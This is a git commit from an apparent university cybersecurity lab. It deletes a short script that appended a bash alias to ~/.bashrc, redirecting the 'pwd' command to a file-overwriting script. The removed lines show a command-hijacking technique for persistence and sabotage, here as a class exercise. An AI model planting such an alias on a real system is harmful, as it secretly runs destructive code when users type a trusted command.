fe25815386b34b114713dca59b27cc96c0869e7a
Annelise Trout <trouta@mail.gvsu.edu>
2020-10-22 21:05:11 -0400

    deleted script2 after checking for alias in script.sh

--- script2.sh
+++
@@ -1,3 +0,0 @@
-# Create alias where 'pwd' is the alias to be used and 'script.sh' is the file overwrite program
-echo "alias pwd='/home/cybersecurity/Desktop/cis458labs/lab07/CIS458-Lab7/script.sh'" >> ~/.bashrc
-source ~/.bashrc
